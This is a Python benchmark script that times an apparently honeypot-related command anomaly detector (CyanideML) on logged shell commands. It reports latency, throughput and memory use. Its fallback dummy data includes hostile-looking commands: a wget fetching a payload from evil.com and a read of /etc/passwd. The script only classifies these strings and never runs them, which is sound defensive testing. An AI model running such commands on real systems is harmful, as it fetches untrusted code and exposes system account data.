import json
import time
import sys
import os
import resource
import statistics

# Add ai-models to path for importing cyanideML
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from cyanide.ml import CyanideML

def get_memory_usage():
    # Returns memory usage in MB
    usage = resource.getrusage(resource.RUSAGE_SELF)
    # ru_maxrss is in bytes on Mac
    return usage.ru_maxrss / 1024 / 1024

def benchmark(limit=10000):
    print(f"Benchmarking with limit={limit} logs...")
    
    # Load dataset
    logs = []
    dataset_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../var/log/cyanide/cyanide_synthetic.json"))
    if not os.path.exists(dataset_path):
        # Fallback to main log if synthetic not found
        dataset_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../var/log/cyanide/cyanide.json"))
        
    if os.path.exists(dataset_path):
        with open(dataset_path, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    cmd = entry.get("command") or entry.get("cmd") or entry.get("input")
                    if cmd:
                        logs.append(str(cmd))
                except Exception:
                    pass
                if len(logs) >= limit:
                    break
    
    if len(logs) < 100:
        print("Warning: Dataset too small or not found. Using dummy commands.")
        logs = ["wget http://evil.com/payload.sh", "ls -la", "pwd", "cat /etc/passwd"] * (limit // 4)
        
    # Initialize Model
    # Assuming standard path or relying on default relative path inside CyanideML
    try:
        model = CyanideML()
    except Exception as e:
        print(f"Failed to load model: {e}")
        return

    # Measure Latency
    latencies = []
    anomalies = 0
    start_time = time.time()
    
    process_memory = get_memory_usage()
    print(f"Initial Memory: {process_memory:.2f} MB")
    
    for i, cmd in enumerate(logs):
        t0 = time.time()
        result = model.analyze_command(cmd)
        t1 = time.time()
        latencies.append((t1 - t0) * 1000) # ms
        if result['is_anomaly']:
            anomalies += 1
            
    total_time = time.time() - start_time
    final_memory = get_memory_usage()
    
    avg_latency = statistics.mean(latencies)
    p99_latency = statistics.quantiles(latencies, n=100)[98]
    throughput = len(logs) / total_time
    
    print("\nResults:")
    print(f"Total Logs: {len(logs)}")
    print(f"Total Time: {total_time:.4f}s")
    print(f"Throughput: {throughput:.2f} logs/sec")
    print(f"Avg Latency: {avg_latency:.4f} ms")
    print(f"P99 Latency: {p99_latency:.4f} ms")
    print(f"Memory Usage Increase: {final_memory - process_memory:.2f} MB (Total: {final_memory:.2f} MB)")
    print(f"Anomalies Detected: {anomalies} ({anomalies/len(logs)*100:.2f}%)")
    
    if avg_latency > 1.0:
        print("FAIL: Avg Latency > 1ms")
    else:
        print("PASS: Avg Latency < 1ms")
        
    return latencies

if __name__ == "__main__":
    benchmark(limit=5000)
